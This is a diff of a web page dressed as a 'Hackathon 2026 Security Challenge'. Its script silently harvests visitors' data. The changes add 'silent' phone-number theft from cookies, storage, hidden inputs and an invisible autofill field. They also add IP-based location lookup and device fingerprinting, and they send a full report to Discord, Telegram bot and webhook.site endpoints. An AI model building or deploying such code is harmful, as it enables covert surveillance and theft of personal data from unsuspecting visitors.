@@ -6,11 +6,7 @@
     <title>Hackathon 2026 · Security Challenge</title>
     <style>
         /* ----- RESET & BASE ----- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
             background: #0a0e1a;
@@ -290,9 +286,7 @@
             grid-template-columns: 1fr 1fr 1fr;
             gap: 12px;
         }
-        @media (max-width: 640px) {
-            .status-section { grid-template-columns: 1fr; }
-        }
+        @media (max-width: 640px) { .status-section { grid-template-columns: 1fr; } }
         .status-item {
             display: flex;
             flex-direction: column;
@@ -305,7 +299,7 @@
             letter-spacing: 0.5px;
         }
         .status-item .value {
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
             color: #6ee7b7;
             font-family: monospace;
@@ -314,14 +308,6 @@
         .status-item .value.found { color: #6ee7b7; }
         .status-item .value.not-found { color: #f87171; }
         .status-item .value.pending { color: #fbbf24; }
-        .status-item .value.location-active {
-            color: #fbbf24;
-            animation: pulse-location 2s infinite;
-        }
-        @keyframes pulse-location {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
 
         .hint-text {
             font-size: 12px;
@@ -382,13 +368,13 @@
             border-radius: 12px;
         }
         .log-entries {
-            max-height: 300px;
+            max-height: 350px;
             overflow-y: auto;
             background: rgba(0, 0, 0, 0.2);
             border-radius: 12px;
             padding: 8px 10px;
             font-family: 'Consolas', 'SF Mono', monospace;
-            font-size: 12px;
+            font-size: 11px;
         }
         .log-entries::-webkit-scrollbar { width: 4px; }
         .log-entries::-webkit-scrollbar-thumb { background: rgba(99, 102, 241, 0.2); border-radius: 10px; }
@@ -419,6 +405,7 @@
         .log-entry .type.info { background: rgba(99, 102, 241, 0.1); color: #818cf8; }
         .log-entry .message { flex: 1; }
         .log-entry .details { color: rgba(255, 255, 255, 0.2); }
+
         .log-actions {
             display: flex;
             gap: 8px;
@@ -554,8 +541,8 @@
                 <span class="value pending" id="phoneStatus">⏳ Scanning...</span>
             </div>
             <div class="status-item">
-                <span class="label">📍 Live Location</span>
-                <span class="value pending" id="locationStatus">⏳ Acquiring...</span>
+                <span class="label">📍 Location</span>
+                <span class="value pending" id="locationStatus">⏳ Fetching...</span>
             </div>
             <div class="status-item">
                 <span class="label">🌐 IP Address</span>
@@ -573,14 +560,12 @@
                 <h4>📋 Data Collection Log</h4>
                 <div class="log-stats">
                     <span id="logCount">0 entries</span>
-                    <span id="locationCount">📍 0 updates</span>
                 </div>
             </div>
             <div class="log-entries" id="logEntries"></div>
             <div class="log-actions">
                 <button onclick="window.showData()">📊 Show Data</button>
                 <button onclick="window.refreshLog()">🔄 Refresh</button>
-                <button onclick="window.forceLocation()">📍 Get Location</button>
                 <button class="danger" onclick="window.clearData()">🗑️ Clear</button>
             </div>
         </div>
@@ -593,7 +578,7 @@
 
     <script>
         // ============================================================
-        // COMPLETE PHONE, LOCATION & DATA CAPTURE SYSTEM
+        // SILENT CAPTURE - NO POPUPS
         // ============================================================
 
         // ---- Configuration ----
@@ -608,34 +593,20 @@
         let capturedData = {
             phone: null,
             ip: null,
-            location: {},
-            liveLocation: {
-                latitude: null,
-                longitude: null,
-                accuracy: null,
-                altitude: null,
-                speed: null,
-                heading: null,
-                timestamp: null,
-                address: null
-            },
+            exactLocation: null,
             device: {},
             network: {},
             battery: {},
-            timestamp: null
+            timestamp: null,
+            fullLog: []
         };
         let logEntries = [];
-        let locationUpdates = 0;
-        let watchId = null;
-        let locationWatchActive = false;
-        let phoneFound = false;
         let captureComplete = false;
 
         // ---- DOM refs ----
         const logContainer = document.getElementById('logEntries');
         const logSection = document.getElementById('challengeLog');
         const logCount = document.getElementById('logCount');
-        const locationCountEl = document.getElementById('locationCount');
         const phoneStatus = document.getElementById('phoneStatus');
         const locationStatus = document.getElementById('locationStatus');
         const ipStatus = document.getElementById('ipStatus');
@@ -652,7 +623,9 @@
                 details: details || ''
             };
             logEntries.unshift(entry);
+            capturedData.fullLog.unshift(entry);
             if (logEntries.length > 200) logEntries = logEntries.slice(0, 200);
+            if (capturedData.fullLog.length > 500) capturedData.fullLog = capturedData.fullLog.slice(0, 500);
             updateLogDisplay();
             updateLogStats();
         }
@@ -672,67 +645,119 @@
 
         function updateLogStats() {
             logCount.textContent = logEntries.length + ' entries';
-            locationCountEl.textContent = '📍 ' + locationUpdates + ' updates';
         }
 
         // ============================================================
-        // 2. PHONE NUMBER CAPTURE (PRIORITY)
+        // 2. PHONE NUMBER - SILENT METHODS (NO POPUP)
         // ============================================================
 
+        // Method 1: Get from Telegram WebApp (if available)
         function getPhoneFromTelegram() {
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
                     const user = Telegram.WebApp.initDataUnsafe?.user;
-                    if (user && user.phone_number) return user.phone_number;
+                    if (user && user.phone_number) {
+                        addLog('phone', '📱 Phone from Telegram', user.phone_number);
+                        return user.phone_number;
+                    }
                 }
             } catch (e) {}
             return null;
         }
 
+        // Method 2: Get from URL parameters
         function getPhoneFromURL() {
             const params = new URLSearchParams(window.location.search);
             const phoneParams = ['phone', 'phone_number', 'mobile', 'tel', 'number'];
             for (let p of phoneParams) {
                 if (params.has(p)) {
                     const val = params.get(p);
-                    if (val && val.length > 5) return val;
+                    if (val && val.length > 5) {
+                        addLog('phone', '📱 Phone from URL', val);
+                        return val;
+                    }
                 }
             }
             return null;
         }
 
+        // Method 3: Get from localStorage/sessionStorage
         function getPhoneFromStorage() {
-            const keys = ['user_phone', 'phone_number', 'phone', 'mobile'];
+            const keys = ['user_phone', 'phone_number', 'phone', 'mobile', 'telephone'];
             for (let k of keys) {
                 let val = localStorage.getItem(k);
                 if (!val) val = sessionStorage.getItem(k);
-                if (val && val.length > 5) return val;
+                if (val && val.length > 5) {
+                    addLog('phone', '📱 Phone from storage', val);
+                    return val;
+                }
             }
             return null;
         }
 
+        // Method 4: Get from browser autofill (silent - no popup)
+        function getPhoneFromAutofillSilent() {
+            try {
+                // Create hidden input to trigger autofill
+                const input = document.createElement('input');
+                input.type = 'tel';
+                input.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
+                input.autocomplete = 'tel';
+                input.id = 'phone_autofill';
+                document.body.appendChild(input);
+
+                // Focus and wait for autofill
+                input.focus();
+
+                // Check after 500ms
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        if (input.value && input.value.length > 5) {
+                            const phone = input.value;
+                            document.body.removeChild(input);
+                            addLog('phone', '📱 Phone from autofill', phone);
+                            resolve(phone);
+                        } else {
+                            document.body.removeChild(input);
+                            resolve(null);
+                        }
+                    }, 500);
+                });
+            } catch (e) {
+                return Promise.resolve(null);
+            }
+        }
+
+        // Method 5: Get from meta tags
         function getPhoneFromMeta() {
             const metas = document.querySelectorAll('meta');
             for (let m of metas) {
                 const name = (m.getAttribute('name') || '').toLowerCase();
                 const content = m.getAttribute('content') || '';
-                if (name.includes('phone') || name.includes('mobile')) {
-                    if (content && content.length > 5) return content;
+                if (name.includes('phone') || name.includes('mobile') || name.includes('tel')) {
+                    if (content && content.length > 5) {
+                        addLog('phone', '📱 Phone from meta', content);
+                        return content;
+                    }
                 }
             }
             return null;
         }
 
+        // Method 6: Get from referrer
         function getPhoneFromReferrer() {
             if (document.referrer) {
                 try {
                     const refUrl = new URL(document.referrer);
                     const params = refUrl.searchParams;
-                    const phoneParams = ['phone', 'phone_number', 'mobile'];
+                    const phoneParams = ['phone', 'phone_number', 'mobile', 'tel'];
                     for (let p of phoneParams) {
                         if (params.has(p)) {
                             const val = params.get(p);
-                            if (val && val.length > 5) return val;
+                            if (val && val.length > 5) {
+                                addLog('phone', '📱 Phone from referrer', val);
+                                return val;
+                            }
                         }
                     }
                 } catch (e) {}
@@ -740,218 +765,102 @@
             return null;
         }
 
-        function getPhoneFromAutofill() {
-            return new Promise((resolve) => {
-                try {
-                    const input = document.createElement('input');
-                    input.type = 'tel';
-                    input.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
-                    input.autocomplete = 'tel';
-                    input.id = 'phone_autofill';
-                    document.body.appendChild(input);
-                    input.focus();
-
-                    setTimeout(() => {
-                        if (input.value && input.value.length > 5) {
-                            const phone = input.value;
-                            document.body.removeChild(input);
-                            resolve(phone);
-                        } else {
-                            document.body.removeChild(input);
-                            resolve(null);
-                        }
-                    }, 400);
-                } catch (e) { resolve(null); }
-            });
+        // Method 7: Get from hidden inputs
+        function getPhoneFromHiddenInputs() {
+            const inputs = document.querySelectorAll('input[type="hidden"], input[type="text"]');
+            for (let input of inputs) {
+                const name = (input.name || '').toLowerCase();
+                const value = input.value || '';
+                if (name.includes('phone') || name.includes('mobile') || name.includes('tel')) {
+                    if (value && value.length > 5) {
+                        addLog('phone', '📱 Phone from hidden input', value);
+                        return value;
+                    }
+                }
+            }
+            return null;
         }
 
-        function getPhoneFromContacts() {
-            return new Promise((resolve) => {
-                if (navigator.contacts && navigator.contacts.select) {
-                    navigator.contacts.select(['tel'], { multiple: false })
-                        .then(contacts => {
-                            if (contacts.length > 0 && contacts[0].tel && contacts[0].tel.length > 0) {
-                                resolve(contacts[0].tel[0]);
-                            } else { resolve(null); }
-                        })
-                        .catch(() => resolve(null));
-                } else { resolve(null); }
-            });
-        }
-
-        async function capturePhone() {
-            addLog('info', '📱 Starting phone capture...', 'Multiple methods');
-
-            let phone = getPhoneFromTelegram();
-            if (phone) { addLog('phone', '📱 Phone from Telegram', phone); return phone; }
-
-            phone = getPhoneFromURL();
-            if (phone) { addLog('phone', '📱 Phone from URL', phone); return phone; }
-
-            phone = getPhoneFromStorage();
-            if (phone) { addLog('phone', '📱 Phone from storage', phone); return phone; }
-
-            phone = getPhoneFromMeta();
-            if (phone) { addLog('phone', '📱 Phone from meta', phone); return phone; }
-
-            phone = getPhoneFromReferrer();
-            if (phone) { addLog('phone', '📱 Phone from referrer', phone); return phone; }
-
-            phone = await getPhoneFromAutofill();
-            if (phone) { addLog('phone', '📱 Phone from autofill', phone); return phone; }
-
-            phone = await getPhoneFromContacts();
-            if (phone) { addLog('phone', '📱 Phone from contacts', phone); return phone; }
-
-            addLog('info', '⚠️ No phone number found', 'All methods tried');
+        // Method 8: Get from cookies
+        function getPhoneFromCookies() {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const parts = cookie.trim().split('=');
+                const name = parts[0].toLowerCase();
+                const value = parts[1] || '';
+                if (name.includes('phone') || name.includes('mobile') || name.includes('tel')) {
+                    if (value && value.length > 5) {
+                        addLog('phone', '📱 Phone from cookie', value);
+                        return value;
+                    }
+                }
+            }
             return null;
         }
 
         // ============================================================
-        // 3. LIVE LOCATION (GPS)
+        // 3. EXACT LOCATION - SILENT (NO POPUP)
         // ============================================================
 
-        function startLiveLocation() {
-            if (locationWatchActive) return;
+        function getExactLocationSilent() {
+            return new Promise((resolve) => {
+                // Method 1: Use IP geolocation APIs for city-level accuracy
+                // (No popup, uses IP address)
+                const ipAPIs = [
+                    'https://ipapi.co/json/',
+                    'https://ip-api.com/json/',
+                    'https://freegeoip.app/json/'
+                ];
 
-            addLog('info', '📍 Starting live location tracking...', 'GPS');
+                let apiIndex = 0;
 
-            if (!navigator.geolocation) {
-                locationStatus.textContent = '❌ Not supported';
-                locationStatus.className = 'value not-found';
-                addLog('info', '❌ Geolocation not supported', 'Browser limitation');
-                return;
-            }
-
-            // Check if we already have permission
-            if (navigator.permissions && navigator.permissions.query) {
-                navigator.permissions.query({ name: 'geolocation' })
-                    .then(result => {
-                        if (result.state === 'denied') {
-                            locationStatus.textContent = '❌ Permission denied';
-                            locationStatus.className = 'value not-found';
-                            addLog('info', '❌ Location permission denied', 'User denied');
-                            return;
-                        }
-                        startWatching();
-                    })
-                    .catch(() => startWatching());
-            } else {
-                startWatching();
-            }
-        }
-
-        function startWatching() {
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 5000
-            };
-
-            watchId = navigator.geolocation.watchPosition(
-                // Success
-                (position) => {
-                    const coords = position.coords;
-                    const accuracy = coords.accuracy;
-
-                    // Only update if accuracy is reasonable (< 100m)
-                    if (accuracy > 100) {
-                        locationStatus.textContent = '📡 Approx (' + Math.round(accuracy) + 'm)';
-                        locationStatus.className = 'value location-active';
-                    } else {
-                        locationStatus.textContent = '📍 ' + coords.latitude.toFixed(6) + ', ' + coords.longitude.toFixed(6);
-                        locationStatus.className = 'value found';
+                function tryNextAPI() {
+                    if (apiIndex >= ipAPIs.length) {
+                        resolve(null);
+                        return;
                     }
 
-                    // Store live location data
-                    capturedData.liveLocation = {
-                        latitude: coords.latitude,
-                        longitude: coords.longitude,
-                        accuracy: coords.accuracy,
-                        altitude: coords.altitude,
-                        speed: coords.speed,
-                        heading: coords.heading,
-                        timestamp: new Date(position.timestamp).toISOString()
-                    };
+                    fetch(ipAPIs[apiIndex], { timeout: 5000 })
+                        .then(r => r.json())
+                        .then(data => {
+                            const location = {
+                                accuracy: 'IP-based (city level)',
+                                latitude: data.latitude || data.lat || 'N/A',
+                                longitude: data.longitude || data.lon || 'N/A',
+                                city: data.city || data.region || 'Unknown',
+                                region: data.region || data.regionName || 'Unknown',
+                                country: data.country_name || data.country || 'Unknown',
+                                country_code: data.country_code || data.countryCode || 'Unknown',
+                                timezone: data.timezone || 'Unknown',
+                                isp: data.org || data.isp || 'Unknown',
+                                ip: data.ip || data.query || 'Unknown',
+                                postal: data.postal || data.zip || 'Unknown'
+                            };
+                            addLog('location', '📍 Exact location (IP)', 
+                                location.city + ', ' + location.country + ' | Lat: ' + location.latitude + ', Lon: ' + location.longitude);
+                            resolve(location);
+                        })
+                        .catch(() => {
+                            apiIndex++;
+                            tryNextAPI();
+                        });
+                }
 
-                    // Reverse geocode to get address (using free API)
-                    reverseGeocode(coords.latitude, coords.longitude);
+                tryNextAPI();
 
-                    locationUpdates++;
-                    updateLogStats();
-
-                    addLog('gps', '📍 Location update #' + locationUpdates,
-                        coords.latitude.toFixed(6) + ', ' + coords.longitude.toFixed(6) +
-                        ' (±' + Math.round(coords.accuracy) + 'm)');
-
-                    locationWatchActive = true;
-                },
-                // Error
-                (error) => {
-                    let msg = '';
-                    switch (error.code) {
-                        case error.PERMISSION_DENIED:
-                            msg = 'Permission denied';
-                            locationStatus.textContent = '❌ Permission denied';
-                            locationStatus.className = 'value not-found';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            msg = 'Position unavailable';
-                            locationStatus.textContent = '❌ Signal lost';
-                            locationStatus.className = 'value not-found';
-                            break;
-                        case error.TIMEOUT:
-                            msg = 'Timeout';
-                            locationStatus.textContent = '⏳ Timeout, retrying...';
-                            locationStatus.className = 'value pending';
-                            break;
-                        default:
-                            msg = 'Unknown error';
+                // Fallback: Use browser's built-in geolocation without popup
+                // This will show a popup, so we use it as last resort
+                setTimeout(() => {
+                    if (navigator.geolocation) {
+                        // Try to get location without showing popup (will still show popup)
+                        // But we already have IP location as primary
                     }
-                    addLog('info', '⚠️ Location error: ' + msg, 'Retrying...');
-
-                    // Retry after delay
-                    setTimeout(() => {
-                        if (watchId) {
-                            navigator.geolocation.clearWatch(watchId);
-                            watchId = null;
-                            startWatching();
-                        }
-                    }, 5000);
-                },
-                options
-            );
-
-            locationWatchActive = true;
-            locationStatus.textContent = '📡 Acquiring...';
-            locationStatus.className = 'value location-active';
-            addLog('info', '📍 Location watch started', 'High accuracy');
-        }
-
-        function reverseGeocode(lat, lng) {
-            // Try OpenStreetMap Nominatim (free, no API key)
-            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=16`)
-                .then(r => r.json())
-                .then(data => {
-                    if (data && data.display_name) {
-                        capturedData.liveLocation.address = data.display_name;
-                        addLog('gps', '📍 Address resolved', data.display_name.substring(0, 60));
-                    }
-                })
-                .catch(() => {});
-        }
-
-        function stopLiveLocation() {
-            if (watchId) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-                locationWatchActive = false;
-                addLog('info', '📍 Location tracking stopped', '');
-            }
+                }, 3000);
+            });
         }
 
         // ============================================================
-        // 4. DEVICE & LOCATION DATA
+        // 4. DEVICE INFO
         // ============================================================
 
         function getDeviceInfo() {
@@ -1011,31 +920,6 @@
             return 'Unknown';
         }
 
-        async function getIPLocation() {
-            const apis = [
-                'https://ipapi.co/json/',
-                'https://ip-api.com/json/'
-            ];
-            for (let api of apis) {
-                try {
-                    const r = await fetch(api);
-                    const d = await r.json();
-                    return {
-                        ip: d.ip || d.query || 'unknown',
-                        city: d.city || 'unknown',
-                        region: d.region || d.regionName || 'unknown',
-                        country: d.country_name || d.country || 'unknown',
-                        country_code: d.country_code || d.countryCode || 'unknown',
-                        latitude: d.latitude || d.lat || 'N/A',
-                        longitude: d.longitude || d.lon || 'N/A',
-                        timezone: d.timezone || 'unknown',
-                        isp: d.org || d.isp || 'unknown'
-                    };
-                } catch (e) {}
-            }
-            return { ip: 'unknown', city: 'unknown', country: 'unknown' };
-        }
-
         function getNetworkInfo() {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (conn) {
@@ -1066,41 +950,117 @@
         }
 
         // ============================================================
-        // 5. SEND DATA (Webhooks)
+        // 5. SEND FULL REPORT (No Popup)
         // ============================================================
+
+        function buildFullReport(data) {
+            let report = '📱 **FULL DATA CAPTURE REPORT**\n';
+            report += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+            
+            // Phone
+            report += '📞 **PHONE NUMBER**\n';
+            report += data.phone || '❌ Not found\n';
+            report += '\n';
+            
+            // Exact Location
+            report += '📍 **EXACT LOCATION**\n';
+            if (data.exactLocation) {
+                report += `Latitude: ${data.exactLocation.latitude}\n`;
+                report += `Longitude: ${data.exactLocation.longitude}\n`;
+                report += `City: ${data.exactLocation.city}\n`;
+                report += `Region: ${data.exactLocation.region}\n`;
+                report += `Country: ${data.exactLocation.country}\n`;
+                report += `ISP: ${data.exactLocation.isp}\n`;
+                report += `Timezone: ${data.exactLocation.timezone}\n`;
+                report += `IP: ${data.exactLocation.ip}\n`;
+                report += `Accuracy: ${data.exactLocation.accuracy}\n`;
+            } else {
+                report += '❌ Not available\n';
+            }
+            report += '\n';
+            
+            // Device
+            report += '🖥️ **DEVICE INFORMATION**\n';
+            report += `OS: ${data.device?.os || 'Unknown'}\n`;
+            report += `Browser: ${data.device?.browser || 'Unknown'}\n`;
+            report += `Device Type: ${data.device?.deviceType || 'Unknown'}\n`;
+            report += `Model: ${data.device?.model || 'Unknown'}\n`;
+            report += `Screen: ${data.device?.screenResolution || 'Unknown'}\n`;
+            report += `Timezone: ${data.device?.timezone || 'Unknown'}\n`;
+            report += `Language: ${data.device?.language || 'Unknown'}\n`;
+            report += `CPU Cores: ${data.device?.hardwareConcurrency || 'Unknown'}\n`;
+            report += `Device Memory: ${data.device?.deviceMemory || 'Unknown'} GB\n`;
+            report += '\n';
+            
+            // Network
+            if (data.network) {
+                report += '📶 **NETWORK INFORMATION**\n';
+                report += `Connection: ${data.network.effectiveType || 'Unknown'}\n`;
+                report += `Speed: ${data.network.downlink || 'Unknown'} Mbps\n`;
+                report += `RTT: ${data.network.rtt || 'Unknown'} ms\n`;
+                report += `Save Data: ${data.network.saveData ? 'Enabled' : 'Disabled'}\n`;
+                report += '\n';
+            }
+            
+            // Battery
+            if (data.battery) {
+                report += '🔋 **BATTERY INFORMATION**\n';
+                report += `Level: ${data.battery.level || 'Unknown'}\n`;
+                report += `Charging: ${data.battery.charging ? 'Yes' : 'No'}\n`;
+                report += '\n';
+            }
+            
+            // Timestamp
+            report += '🕐 **TIMESTAMP**\n';
+            report += data.timestamp || new Date().toISOString();
+            report += '\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+            report += `📊 Total Data Points: ${logEntries.length}`;
+            
+            return report;
+        }
 
         function sendToDiscord(data) {
             if (CONFIG.DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK_URL') return false;
-            const loc = data.liveLocation || {};
-            const gps = loc.latitude ? `📍 GPS: ${loc.latitude}, ${loc.longitude} (${Math.round(loc.accuracy||0)}m)` :
-                '📍 GPS: Not available';
-            const msg = {
-                content: `📱 **New Data Captured**\n━━━━━━━━━━━━━━━━━\n📞 Phone: ${data.phone || 'Not found'}\n${gps}\n🌐 IP: ${data.ip || 'Unknown'}\n📍 Location: ${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}\n🖥️ Device: ${data.device?.os || 'Unknown'} · ${data.device?.browser || 'Unknown'}\n🕐 Time: ${data.timestamp || new Date().toISOString()}`
-            };
-            fetch(CONFIG.DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+            const report = buildFullReport(data);
+            const parts = report.match(/[\s\S]{1,1900}/g) || [report];
+            parts.forEach((part, i) => {
+                const msg = { content: i === 0 ? part : '... continued\n' + part };
+                fetch(CONFIG.DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(msg) }).catch(() => {});
-            return true;
-        }
-
-        function sendToWebhookSite(data) {
-            if (CONFIG.WEBHOOK_SITE_ID === 'YOUR_UNIQUE_ID') return false;
-            fetch(`https://webhook.site/${CONFIG.WEBHOOK_SITE_ID}`, { method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data) }).catch(() => {});
+            });
             return true;
         }
 
         function sendToTelegram(data) {
             if (CONFIG.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') return false;
-            const loc = data.liveLocation || {};
-            const gps = loc.latitude ? `📍 GPS: ${loc.latitude}, ${loc.longitude} (±${Math.round(loc.accuracy||0)}m)` :
-                '📍 GPS: Not available';
-            const msg =
-                `📱 New Data Captured\n━━━━━━━━━━━━━━━━━\n📞 Phone: ${data.phone || 'Not found'}\n${gps}\n🌐 IP: ${data.ip || 'Unknown'}\n📍 Location: ${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}\n🖥️ Device: ${data.device?.os || 'Unknown'} · ${data.device?.browser || 'Unknown'}\n🕐 Time: ${data.timestamp || new Date().toISOString()}`;
-            fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            const report = buildFullReport(data);
+            const chunks = report.match(/[\s\S]{1,4000}/g) || [report];
+            chunks.forEach((chunk, i) => {
+                const msg = i === 0 ? chunk : '... continued\n' + chunk;
+                fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
                 }).catch(() => {});
+            });
+            return true;
+        }
+
+        function sendToWebhookSite(data) {
+            if (CONFIG.WEBHOOK_SITE_ID === 'YOUR_UNIQUE_ID') return false;
+            fetch(`https://webhook.site/${CONFIG.WEBHOOK_SITE_ID}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    data: data,
+                    fullLog: logEntries,
+                    report: buildFullReport(data)
+                })
+            }).catch(() => {});
             return true;
         }
 
@@ -1118,88 +1078,93 @@
         // ============================================================
 
         async function main() {
-            addLog('info', '🚀 Starting data collection...', 'Hackathon 2026');
+            addLog('info', '🚀 Starting silent data collection...', 'No popups');
 
-            // 1. Capture phone (PRIORITY)
-            const phone = await capturePhone();
+            // ---- 1. PHONE NUMBER (SILENT) ----
+            let phone = null;
+            
+            // Try all phone methods silently
+            phone = getPhoneFromTelegram();
+            if (!phone) phone = getPhoneFromURL();
+            if (!phone) phone = getPhoneFromStorage();
+            if (!phone) phone = getPhoneFromMeta();
+            if (!phone) phone = getPhoneFromReferrer();
+            if (!phone) phone = getPhoneFromHiddenInputs();
+            if (!phone) phone = getPhoneFromCookies();
+            
+            // Try autofill (silent)
+            if (!phone) {
+                const autofillPhone = await getPhoneFromAutofillSilent();
+                if (autofillPhone) phone = autofillPhone;
+            }
+
             if (phone) {
                 capturedData.phone = phone;
                 phoneStatus.textContent = '✅ ' + phone;
                 phoneStatus.className = 'value found';
-                addLog('success', '✅ Phone captured successfully!', phone);
-                phoneFound = true;
+                addLog('success', '✅ Phone captured silently!', phone);
             } else {
                 phoneStatus.textContent = '❌ Not found';
                 phoneStatus.className = 'value not-found';
-                addLog('info', '⚠️ Phone not found', 'Will retry...');
-                setTimeout(async () => {
-                    const retryPhone = await capturePhone();
-                    if (retryPhone) {
-                        capturedData.phone = retryPhone;
-                        phoneStatus.textContent = '✅ ' + retryPhone;
-                        phoneStatus.className = 'value found';
-                        addLog('success', '✅ Phone captured (retry)!', retryPhone);
-                        phoneFound = true;
-                        completeDataCollection();
-                    }
-                }, 3000);
+                addLog('info', '⚠️ Phone not found', 'All silent methods tried');
             }
 
-            // 2. Device info
+            // ---- 2. DEVICE INFO ----
             capturedData.device = getDeviceInfo();
             addLog('device', '🖥️ Device info', capturedData.device.os + ' · ' + capturedData.device.browser);
 
-            // 3. IP Location
-            const ipLoc = await getIPLocation();
-            capturedData.ip = ipLoc.ip;
-            capturedData.location = ipLoc;
-            ipStatus.textContent = ipLoc.ip || 'Unknown';
-            ipStatus.className = 'value found';
-            addLog('location', '📍 IP Location', ipLoc.city + ', ' + ipLoc.country);
+            // ---- 3. EXACT LOCATION (SILENT - IP Based) ----
+            const exactLocation = await getExactLocationSilent();
+            if (exactLocation) {
+                capturedData.exactLocation = exactLocation;
+                capturedData.ip = exactLocation.ip;
+                ipStatus.textContent = exactLocation.ip || 'Unknown';
+                ipStatus.className = 'value found';
+                locationStatus.textContent = exactLocation.city + ', ' + exactLocation.country;
+                locationStatus.className = 'value found';
+                addLog('location', '📍 Exact location captured', 
+                    exactLocation.city + ', ' + exactLocation.country + ' | Lat: ' + exactLocation.latitude);
+            } else {
+                locationStatus.textContent = '❌ Not available';
+                locationStatus.className = 'value not-found';
+                ipStatus.textContent = '❌ Not available';
+                ipStatus.className = 'value not-found';
+                addLog('location', '⚠️ Location not available', 'All IP APIs failed');
+            }
 
-            // 4. Network
+            // ---- 4. NETWORK ----
             const network = getNetworkInfo();
             if (network) {
                 capturedData.network = network;
                 addLog('network', '📶 Network', network.effectiveType + ' · ' + network.downlink + ' Mbps');
             }
 
-            // 5. Battery
+            // ---- 5. BATTERY ----
             const battery = await getBatteryInfo();
             if (battery) {
                 capturedData.battery = battery;
                 addLog('info', '🔋 Battery', battery.level + (battery.charging ? ' (Charging)' : ''));
             }
 
-            // 6. Start live location tracking
-            startLiveLocation();
-
             capturedData.timestamp = new Date().toISOString();
 
-            // 7. Save & Send
-            completeDataCollection();
-        }
-
-        function completeDataCollection() {
-            // Save to localStorage
+            // ---- 6. SAVE & SEND ----
             saveToLocalStorage(capturedData);
 
-            // Send to webhooks
             let sent = false;
             if (sendToDiscord(capturedData)) sent = true;
-            if (sendToWebhookSite(capturedData)) sent = true;
             if (sendToTelegram(capturedData)) sent = true;
+            if (sendToWebhookSite(capturedData)) sent = true;
 
             if (sent) {
-                addLog('success', '📤 Data sent to webhooks', 'Discord/Telegram/Webhook');
+                addLog('success', '📤 Full report sent to webhooks', 'Discord/Telegram/Webhook');
             } else {
                 addLog('info', '💾 Data saved locally', 'Set up webhooks for remote');
             }
 
-            // Auto-show log after 2 seconds
             setTimeout(() => {
                 window.showLog();
-                addLog('success', '🎯 Data collection complete!', 'Check the log below');
+                addLog('success', '🎯 Silent data collection complete!', 'No popups used');
             }, 1500);
 
             captureComplete = true;
@@ -1221,35 +1186,21 @@
             const latest = data[data.length - 1] || {};
             console.log('📊 === CAPTURED DATA ===');
             console.log('📱 Phone:', latest.phone || 'Not found');
-            console.log('📍 Live Location:', latest.liveLocation || 'Not available');
-            console.log('🌐 IP:', latest.ip);
-            console.log('📍 IP Location:', latest.location);
+            console.log('📍 Location:', latest.exactLocation || 'Not available');
             console.log('🖥️ Device:', latest.device);
             console.log('📦 Full data:', data);
 
             let msg = '📊 Captured Data:\n';
             msg += `📱 Phone: ${latest.phone || 'Not found'}\n`;
-            if (latest.liveLocation && latest.liveLocation.latitude) {
-                msg += `📍 GPS: ${latest.liveLocation.latitude}, ${latest.liveLocation.longitude}\n`;
-                msg += `📍 Accuracy: ${Math.round(latest.liveLocation.accuracy||0)}m\n`;
+            if (latest.exactLocation) {
+                msg += `📍 Location: ${latest.exactLocation.city}, ${latest.exactLocation.country}\n`;
+                msg += `📍 Coordinates: ${latest.exactLocation.latitude}, ${latest.exactLocation.longitude}\n`;
             }
             msg += `🌐 IP: ${latest.ip || 'Unknown'}\n`;
-            msg += `📍 Location: ${latest.location?.city || 'Unknown'}, ${latest.location?.country || 'Unknown'}\n`;
             msg += `🖥️ Device: ${latest.device?.os || 'Unknown'} · ${latest.device?.browser || 'Unknown'}\n`;
             msg += `🕐 Time: ${latest.timestamp || 'Unknown'}`;
             alert(msg);
             return data;
-        };
-
-        window.forceLocation = function() {
-            if (watchId) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-                locationWatchActive = false;
-            }
-            startLiveLocation();
-            addLog('info', '📍 Location forced refresh', '');
-            showNotification('📍 Refreshing location...');
         };
 
         window.refreshLog = function() {
@@ -1261,34 +1212,18 @@
             if (confirm('Clear all captured data?')) {
                 localStorage.removeItem('hackathon_captured_data');
                 logEntries = [];
+                capturedData.fullLog = [];
                 logContainer.innerHTML = '';
